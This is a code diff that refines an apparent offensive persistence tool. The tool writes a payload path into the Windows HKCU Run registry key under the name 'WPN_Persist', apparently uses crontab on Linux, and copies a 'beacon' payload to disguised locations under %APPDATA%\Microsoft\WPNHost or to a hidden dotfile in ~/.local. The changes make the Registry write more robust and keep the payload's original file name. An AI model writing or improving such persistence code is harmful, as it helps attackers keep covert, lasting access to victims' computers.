@@ -21,9 +21,8 @@ def linux_crontab(payload_path):
 def windows_registry(payload_path):
     try:
         import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                             r"Software\Microsoft\Windows\CurrentVersion\Run",
-                             0, winreg.KEY_SET_VALUE)
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+                               r"Software\Microsoft\Windows\CurrentVersion\Run")
         winreg.SetValueEx(key, "WPN_Persist", 0, winreg.REG_SZ, payload_path)
         winreg.CloseKey(key)
         print("[+] Registry persistence added at HKCU\\...\\Run\\WPN_Persist")
@@ -62,14 +61,15 @@ def main():
     print(f"[*] Applying persistence using mode: {args.mode}")
 
     # === Copy payload to a hidden or startup-safe path ===
+    original_name = os.path.basename(src_payload)
     if args.target_dir:
         os.makedirs(args.target_dir, exist_ok=True)
-        dst_path = os.path.join(args.target_dir, os.path.basename(src_payload))
+        dst_path = os.path.join(args.target_dir, original_name)
     else:
         if current_os == "windows":
-            dst_path = os.path.expandvars(r"%APPDATA%\Microsoft\WPNHost\beacon.py")
+            dst_path = os.path.expandvars(rf"%APPDATA%\Microsoft\WPNHost\{original_name}")
         else:
-            dst_path = os.path.expanduser("~/.local/.beacon.py")
+            dst_path = os.path.expanduser(f"~/.local/.{original_name}")
 
     try:
         os.makedirs(os.path.dirname(dst_path), exist_ok=True)
@@ -98,4 +98,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
